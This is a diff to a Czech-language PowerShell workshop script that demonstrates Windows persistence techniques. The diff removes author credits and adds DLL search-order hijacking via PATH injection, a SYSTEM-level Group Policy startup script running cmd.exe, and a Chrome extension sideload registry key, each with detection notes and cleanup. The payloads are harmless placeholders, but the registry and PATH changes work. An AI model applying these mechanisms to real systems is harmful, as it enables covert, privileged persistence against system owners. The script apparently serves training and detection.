@@ -18,7 +18,6 @@ param(
     Each technique is implemented in a safe way for educational purposes.
     The script includes both user-level and system-level persistence methods.
 .NOTES
-    Created by: Hack3r.cz
     For educational purposes only.
     Always obtain proper authorization before testing on any system.
 #>
@@ -275,6 +274,17 @@ function Get-PersistenceStatus {
     $bootDriver = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\DemoBootDriver" -ErrorAction SilentlyContinue
     $status[37] = ($null -ne $bootDriver) -and ($bootDriver.Start -eq 0)
     
+    # 38) DLL Search Order Hijacking
+    $dllPath = Join-Path $env:TEMP "demo_hijack.dll"
+    $userPath = [Environment]::GetEnvironmentVariable("Path", "User")
+    $status[38] = (Test-Path $dllPath) -and ($userPath -like "*$env:TEMP*")
+    
+    # 39) Group Policy Scripts
+    $status[39] = Test-Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Group Policy\Scripts\Startup\0\0"
+    
+    # 40) Browser Extension (Chrome)
+    $status[40] = Test-Path "HKCU:\Software\Google\Chrome\Extensions\demo_extension_id"
+    
     return $status
 }
 
@@ -291,7 +301,6 @@ function Show-Menu {
     Clear-Host
     Write-Host "==========================================================" -ForegroundColor Cyan
     Write-Host "  Windows Persistence Techniques Demonstration Script" -ForegroundColor Cyan
-    Write-Host "  Created by: Hack3r.cz" -ForegroundColor Cyan
     Write-Host "  For educational purposes only." -ForegroundColor Cyan
     Write-Host "==========================================================" -ForegroundColor Cyan
     Write-Host "Vyberte techniku persistence, kterou chcete demonstrovat:" -ForegroundColor Yellow
@@ -341,6 +350,9 @@ function Show-Menu {
     Write-Host " 35) $(Format-Status $st[35]) Kernel Driver Persistence (Type=1 Service)" -ForegroundColor Red
     Write-Host " 36) $(Format-Status $st[36]) Safe Mode with Networking Persistence" -ForegroundColor Red
     Write-Host " 37) $(Format-Status $st[37]) Boot-Start Driver (Bootkit demonstration)" -ForegroundColor Red
+    Write-Host " 38) $(Format-Status $st[38]) DLL Search Order Hijacking (PATH injection)" -ForegroundColor Yellow
+    Write-Host " 39) $(Format-Status $st[39]) Group Policy Startup Scripts" -ForegroundColor Yellow
+    Write-Host " 40) $(Format-Status $st[40]) Browser Extension Persistence (Chrome)" -ForegroundColor Yellow
     Write-Host ""
     Write-Host "--- Ostatni ---" -ForegroundColor Cyan
     Write-Host " 90) Restartovat skript jako Administrator (UAC prompt)" -ForegroundColor Yellow
@@ -355,7 +367,6 @@ function Show-Menu {
 Clear-Host
 Write-Host "==========================================================" -ForegroundColor Cyan
 Write-Host "  Windows Persistence Techniques Demonstration Script" -ForegroundColor Cyan
-Write-Host "  Created by: Hack3r.cz" -ForegroundColor Cyan
 Write-Host "  For educational purposes only." -ForegroundColor Cyan
 Write-Host "==========================================================" -ForegroundColor Cyan
 Write-Host "Tento skript demonstruje ruzne techniky perzistence v systemu Windows." -ForegroundColor Yellow
@@ -733,7 +744,7 @@ do {
                 $folder = $svc.GetFolder("\")
                 $td = $svc.NewTask(0)
 
-                $td.RegistrationInfo.Description = "Demo persistence spoustena pri zamknuti obrazovky - Hack3r.cz workshop"
+                $td.RegistrationInfo.Description = "Demo persistence spoustena pri zamknuti obrazovky - educational workshop"
                 $td.Settings.Enabled = $true
                 $td.Settings.Hidden = $false
                 $td.Settings.DisallowStartIfOnBatteries = $false
@@ -884,7 +895,7 @@ do {
             if (-not (Test-Path $progIdPath)) { New-Item -Path $progIdPath -Force | Out-Null }
             New-ItemProperty -Path $progIdPath -Name "(Default)" -Value 'cmd.exe /k echo File association handler spustena! Argument: "%1"' -PropertyType String -Force | Out-Null
             $testFile = Join-Path $env:TEMP "test.demopers"
-            "Testovaci soubor pro demonstraci File Association Hijack (Hack3r.cz workshop)." | Set-Content -Path $testFile -Encoding UTF8
+            "Testovaci soubor pro demonstraci File Association Hijack (educational workshop)." | Set-Content -Path $testFile -Encoding UTF8
             Write-Host "Pridano: .demopers -> demopers.file\shell\open\command = cmd.exe" -ForegroundColor Green
             Write-Host "Vytvoreno: testovaci soubor $testFile" -ForegroundColor Green
             Write-Host "Kdy se spousti: kdyz uzivatel otevre soubor s priponou .demopers (dvojklik v Exploreru)." -ForegroundColor Yellow
@@ -955,7 +966,7 @@ do {
                 $Shortcut.Arguments = '/k echo Shortcut hijack spustena! Tento shortcut puvodni aplikaci nespusti, ale cmd.exe.'
                 $Shortcut.WorkingDirectory = "C:\Windows\System32"
                 $Shortcut.WindowStyle = 1
-                $Shortcut.Description = "Demo persistence via .lnk modification - Hack3r.cz"
+                $Shortcut.Description = "Demo persistence via .lnk modification - educational purposes"
                 $Shortcut.IconLocation = "C:\Windows\System32\shell32.dll,21"
                 $Shortcut.Save()
                 Write-Host "Pridano: Desktop shortcut '$testLnkPath' -> Target: cmd.exe" -ForegroundColor Green
@@ -1161,6 +1172,164 @@ do {
             } catch {
                 Write-Host "Chyba pri vytvareni Boot-Start Driver: $_" -ForegroundColor Red
                 Log-Action "ERROR creating Boot-Start Driver: $_"
+            }
+        }
+        38 {
+            # T1574.001 - DLL Search Order Hijacking
+            # Demo: vytvorime "demo_hijack.dll" v %TEMP% a pridame %TEMP% do PATH
+            # Kdyz aplikace hleda demo_hijack.dll, Windows ji najde v %TEMP% pred system32
+            Write-Host "DLL Search Order Hijacking: PATH injection vulnerability demo"
+            Write-Host ""
+            Write-Host "CO TO JE:" -ForegroundColor Cyan
+            Write-Host "  - Aplikace hleda DLL bez absolutni cesty (napr. LoadLibrary('version.dll'))" -ForegroundColor Gray
+            Write-Host "  - Windows hleda DLL v tomto poradi:" -ForegroundColor Gray
+            Write-Host "    1. Current working directory aplikace" -ForegroundColor Gray
+            Write-Host "    2. System32\\" -ForegroundColor Gray
+            Write-Host "    3. System\\" -ForegroundColor Gray
+            Write-Host "    4. Windows\\" -ForegroundColor Gray
+            Write-Host "    5. Aktualny adresar (kde je exe)" -ForegroundColor Gray
+            Write-Host "    6. PATH promenna" -ForegroundColor Gray
+            Write-Host "  - Utocnik umisti svou DLL do adresare s vyssi prioritou" -ForegroundColor Gray
+            Write-Host ""
+            
+            # Vytvorime dummy DLL soubor v %TEMP%
+            $dllPath = Join-Path $env:TEMP "demo_hijack.dll"
+            "MZ demo DLL for persistence workshop - NOT A REAL DLL" | Set-Content $dllPath -Encoding ASCII
+            Write-Host "Vytvoren demo soubor: $dllPath" -ForegroundColor Green
+            
+            # Pridame %TEMP% do PATH (persistence mechanismus)
+            $currentPath = [Environment]::GetEnvironmentVariable("Path", "User")
+            if ($currentPath -notlike "*$env:TEMP*") {
+                [Environment]::SetEnvironmentVariable("Path", "$currentPath;$env:TEMP", "User")
+                Write-Host "Pridan %TEMP% do PATH (User) -> $env:TEMP" -ForegroundColor Green
+            } else {
+                Write-Host "%TEMP% uz je v PATH (User)" -ForegroundColor Yellow
+            }
+            
+            Write-Host ""
+            Write-Host "Pridano: DLL Search Order Hijacking -> demo_hijack.dll v %TEMP% + PATH injection" -ForegroundColor Green
+            Write-Host "Kdy se spousti: kdyz aplikace hleda demo_hijack.dll a najde ji v PATH pred system32." -ForegroundColor Yellow
+            Write-Host "Pouziti: exploitace aplikaci s chybejici DLL nebo weak DLL search order." -ForegroundColor Yellow
+            Write-Host "POZOR: Toto je jen textovy soubor artefakt - demo_hijack.dll NENI skutecna binarka." -ForegroundColor Cyan
+            Write-Host ""
+            Write-Host "REALNE CILE (priklady zranitelnych aplikaci):" -ForegroundColor Magenta
+            Write-Host "  - Aplikace v C:\\Program Files\\ hledajici version.dll, dwmapi.dll" -ForegroundColor Gray
+            Write-Host "  - Electron apps (Discord, Slack, VS Code) - hledaji libGLESv2.dll, d3dcompiler_47.dll" -ForegroundColor Gray
+            Write-Host "  - Java aplikace - hledaji msvcr100.dll v current dir" -ForegroundColor Gray
+            Write-Host ""
+            Write-Host "MITRE ATT&CK: T1574.001 (DLL Search Order Hijacking)" -ForegroundColor Cyan
+            Write-Host ""
+            Log-Action "Created DLL Search Order Hijacking: $dllPath, added %TEMP% to PATH"
+        }
+        39 {
+            # T1037 - Boot or Logon Initialization Scripts (Group Policy)
+            # Startup/shutdown/logon/logoff scripty ve Group Policy (local nebo domain GPO)
+            if (-not (Require-Administrator)) { break }
+            Write-Host "Group Policy Startup Scripts (Machine-level)"
+            Write-Host ""
+            Write-Host "CO TO JE:" -ForegroundColor Cyan
+            Write-Host "  - Group Policy umoznuje spoustet scripty pri startup/shutdown/logon/logoff" -ForegroundColor Gray
+            Write-Host "  - Machine scripty (Startup/Shutdown) bezí pod SYSTEM" -ForegroundColor Gray
+            Write-Host "  - User scripty (Logon/Logoff) bezí pod uzivatelskym uctem" -ForegroundColor Gray
+            Write-Host "  - V domen: centralne spravovano pres Domain GPO" -ForegroundColor Gray
+            Write-Host "  - V workgroup: lokalne pres Local Group Policy (gpedit.msc)" -ForegroundColor Gray
+            Write-Host ""
+            
+            # Vytvorime registry strukturu pro GP Startup script (machine-level)
+            $regPath = "HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\Scripts\\Startup\\0\\0"
+            try {
+                New-Item $regPath -Force | Out-Null
+                New-ItemProperty $regPath -Name "Script" -Value "cmd.exe" -PropertyType String -Force | Out-Null
+                New-ItemProperty $regPath -Name "Parameters" -Value "/k echo [GP STARTUP SCRIPT] Spusten pod SYSTEM pri boot" -PropertyType String -Force | Out-Null
+                New-ItemProperty $regPath -Name "IsPowershell" -Value 0 -PropertyType DWord -Force | Out-Null
+                New-ItemProperty $regPath -Name "ExecTime" -Value 0 -PropertyType QWord -Force | Out-Null
+                
+                # Nastavime GPO metadata (parent key)
+                $counterPath = "HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\Scripts\\Startup\\0"
+                New-ItemProperty $counterPath -Name "GPO-ID" -Value "LocalGPO" -PropertyType String -Force -ErrorAction SilentlyContinue | Out-Null
+                New-ItemProperty $counterPath -Name "SOM-ID" -Value "Local" -PropertyType String -Force -ErrorAction SilentlyContinue | Out-Null
+                New-ItemProperty $counterPath -Name "FileSysPath" -Value "C:\\Windows\\System32\\GroupPolicy\\Machine" -PropertyType String -Force -ErrorAction SilentlyContinue | Out-Null
+                New-ItemProperty $counterPath -Name "DisplayName" -Value "Local Group Policy" -PropertyType String -Force -ErrorAction SilentlyContinue | Out-Null
+                
+                Write-Host ""
+                Write-Host "Pridano: Group Policy Startup Script -> cmd.exe pod SYSTEM" -ForegroundColor Green
+                Write-Host "Registry: $regPath" -ForegroundColor Green
+                Write-Host ""
+                Write-Host "Kdy se spousti: VELMI BRZY pri startu systemu (machine scripts), pred user logon." -ForegroundColor Yellow
+                Write-Host "Pouziti: APT skupiny v enterprise prostredi - vypada jako legitimni GPO z domeny." -ForegroundColor Yellow
+                Write-Host ""
+                Write-Host "REALNE UTOKY:" -ForegroundColor Magenta
+                Write-Host "  - APT29 (Cozy Bear) - GPO scripty v kompromitovanych AD" -ForegroundColor Gray
+                Write-Host "  - FIN7 - lokalni GPO startup scripty na standalone serverech" -ForegroundColor Gray
+                Write-Host "  - Ransomware - GPO distribuce payloadu po AD (GPP Preferences, scripty)" -ForegroundColor Gray
+                Write-Host ""
+                Write-Host "DETEKCE:" -ForegroundColor Cyan
+                Write-Host "  - Registry: HKLM\\...\\Group Policy\\Scripts\\" -ForegroundColor Yellow
+                Write-Host "  - File System: C:\\Windows\\System32\\GroupPolicy\\Machine\\Scripts\\Startup\\" -ForegroundColor Yellow
+                Write-Host "  - Event Log: Event ID 4104 (PowerShell script block), 4688 (Process Create)" -ForegroundColor Yellow
+                Write-Host "  - GPO Audit: gpresult /H report.html (ukazuje vsechny aplikovane GPO)" -ForegroundColor Yellow
+                Write-Host ""
+                Write-Host "MITRE ATT&CK: T1037 (Boot or Logon Initialization Scripts)" -ForegroundColor Cyan
+                Write-Host ""
+                Log-Action "Added GP Startup Script: cmd.exe (Machine-level, runs as SYSTEM)"
+            } catch {
+                Write-Host "Chyba pri vytvareni GP Startup Script: $_" -ForegroundColor Red
+                Log-Action "ERROR creating GP Startup Script: $_"
+            }
+        }
+        40 {
+            # T1176 - Browser Extensions
+            # Demo: Chrome extension persistence pres registry (enterprise policy nebo user-level sideload)
+            Write-Host "Browser Extension Persistence (Chrome demo)"
+            Write-Host ""
+            Write-Host "CO TO JE:" -ForegroundColor Cyan
+            Write-Host "  - Malicious extension nahrana do browseru (Chrome, Edge, Firefox)" -ForegroundColor Gray
+            Write-Host "  - Persistence pres:" -ForegroundColor Gray
+            Write-Host "    1. Enterprise Policy (force-install, vyzaduje admin)" -ForegroundColor Gray
+            Write-Host "    2. Sideload do User Data (Developer mode, nevyzaduje admin)" -ForegroundColor Gray
+            Write-Host "    3. Chrome Web Store (legitimni extension update jako backdoor)" -ForegroundColor Gray
+            Write-Host "  - Extension ma pristup k:" -ForegroundColor Gray
+            Write-Host "    - Vsem web strankam (keylogging, credential theft)" -ForegroundColor Gray
+            Write-Host "    - Cookies, session tokens, local storage" -ForegroundColor Gray
+            Write-Host "    - Clipboard, download history" -ForegroundColor Gray
+            Write-Host ""
+            
+            # Vytvorime registry klic pro Chrome extension (user-level)
+            $regPath = "HKCU:\\Software\\Google\\Chrome\\Extensions\\demo_extension_id"
+            try {
+                New-Item $regPath -Force | Out-Null
+                New-ItemProperty $regPath -Name "update_url" -Value "https://clients2.google.com/service/update2/crx" -PropertyType String -Force | Out-Null
+                New-ItemProperty $regPath -Name "path" -Value "$env:TEMP\\demo_extension" -PropertyType String -Force | Out-Null
+                New-ItemProperty $regPath -Name "version" -Value "1.0.0" -PropertyType String -Force | Out-Null
+                
+                Write-Host ""
+                Write-Host "Pridano: Chrome Extension registry key -> demo_extension_id" -ForegroundColor Green
+                Write-Host "Registry: $regPath" -ForegroundColor Green
+                Write-Host ""
+                Write-Host "Kdy se spousti: pri startu Chrome, extension se nacte automaticky." -ForegroundColor Yellow
+                Write-Host "Pouziti: credential theft, keylogging, C2 communication pres browser, cookie stealing." -ForegroundColor Yellow
+                Write-Host "POZOR: Extension ID je dummy - skutecna extension by musela existovat v Chrome Web Store nebo sideloaded." -ForegroundColor Cyan
+                Write-Host ""
+                Write-Host "REALNE UTOKY:" -ForegroundColor Magenta
+                Write-Host "  - Grandoreiro (banking malware) - Chrome extension pro MFA bypass" -ForegroundColor Gray
+                Write-Host "  - Browser Spyware campaigns - fake VPN/AdBlock extensions" -ForegroundColor Gray
+                Write-Host "  - Nigelthorn - extension distribuovana pres Facebook spam (2018)" -ForegroundColor Gray
+                Write-Host "  - CacheFlow - crypto-mining extension v Chrome Web Store (2017)" -ForegroundColor Gray
+                Write-Host ""
+                Write-Host "DETEKCE:" -ForegroundColor Cyan
+                Write-Host "  - Chrome extensions folder: %LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Extensions\\" -ForegroundColor Yellow
+                Write-Host "  - Edge: %LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\Default\\Extensions\\" -ForegroundColor Yellow
+                Write-Host "  - Firefox: %APPDATA%\\Mozilla\\Firefox\\Profiles\\<profile>\\extensions\\" -ForegroundColor Yellow
+                Write-Host "  - Registry: HKCU\\Software\\Google\\Chrome\\Extensions\\" -ForegroundColor Yellow
+                Write-Host "  - Enterprise: HKLM\\Software\\Policies\\Google\\Chrome\\ExtensionInstallForcelist" -ForegroundColor Yellow
+                Write-Host "  - chrome://extensions/ (v browseru, ale snadno schovatelne)" -ForegroundColor Yellow
+                Write-Host ""
+                Write-Host "MITRE ATT&CK: T1176 (Browser Extensions)" -ForegroundColor Cyan
+                Write-Host ""
+                Log-Action "Added Chrome extension registry: demo_extension_id (user-level sideload artifact)"
+            } catch {
+                Write-Host "Chyba pri vytvareni Browser Extension persistence: $_" -ForegroundColor Red
+                Log-Action "ERROR creating Browser Extension: $_"
             }
         }
         0 {
@@ -1410,6 +1579,32 @@ do {
             # 37 Boot-Start Driver
             Remove-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Services\DemoBootDriver" -Recurse -Force -ErrorAction SilentlyContinue
             Log-Action "Removed Boot-Start Driver registry artifact: DemoBootDriver"
+
+            # --- Cleanup novych technik (38-40) ---
+
+            # 38 DLL Search Order Hijacking
+            $dllPath = Join-Path $env:TEMP "demo_hijack.dll"
+            Remove-Item -Path $dllPath -Force -ErrorAction SilentlyContinue
+            # Odstranime %TEMP% z PATH (pokud tam byl pridan)
+            try {
+                $currentPath = [Environment]::GetEnvironmentVariable("Path", "User")
+                if ($currentPath -like "*$env:TEMP*") {
+                    $newPath = $currentPath -replace [regex]::Escape(";$env:TEMP"), ""
+                    $newPath = $newPath -replace [regex]::Escape("$env:TEMP;"), ""
+                    [Environment]::SetEnvironmentVariable("Path", $newPath, "User")
+                }
+                Log-Action "Removed DLL hijack artifact $dllPath and cleaned PATH"
+            } catch {
+                Log-Action "ERROR cleaning DLL hijack PATH: $_"
+            }
+
+            # 39 Group Policy Scripts
+            Remove-Item -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Group Policy\Scripts\Startup\0" -Recurse -Force -ErrorAction SilentlyContinue
+            Log-Action "Removed GP Startup Scripts registry entries"
+
+            # 40 Browser Extension (Chrome)
+            Remove-Item -Path "HKCU:\Software\Google\Chrome\Extensions\demo_extension_id" -Recurse -Force -ErrorAction SilentlyContinue
+            Log-Action "Removed Chrome extension registry: demo_extension_id"
 
             Write-Host "Vsechny persistence techniky byly odstraneny."
         }
